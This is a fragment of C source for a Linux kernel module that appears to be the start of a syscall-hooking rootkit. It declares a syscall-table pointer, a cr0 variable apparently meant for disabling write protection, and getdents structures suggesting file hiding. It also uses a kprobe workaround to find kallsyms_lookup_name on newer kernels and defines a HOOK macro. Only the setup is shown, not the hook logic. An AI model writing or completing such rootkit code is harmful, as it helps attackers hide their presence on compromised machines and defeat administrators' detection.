

#include <linux/linkage.h>
#include <linux/dirent.h>
#include <linux/kprobes.h>

unsigned long cr0;
unsigned long *__syscall_table;
unsigned long __force_order;

enum My_NR_getdents {
    MY_NR_getdents = 141
};

struct linux_dirent {
    unsigned long   d_ino;
    unsigned long   d_off;
    unsigned short  d_reclen;
    char            d_name[];
};

/*
 * On Linux kernels 5.7+, kallsyms_lookup_name() is no longer exported, 
 * so we have to use kprobes to get the address.
 * Full credit to @f0lg0 for the idea.
 * And full credit to Harvey Phillips (xcellerator@gmx.com) for code that inspired me.
 */
static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};

#define HOOK(_name, _hook, _orig)   \
{                   \
    .name = (_name),        \
    .function = (_hook),        \
    .original = (_orig),        \
}
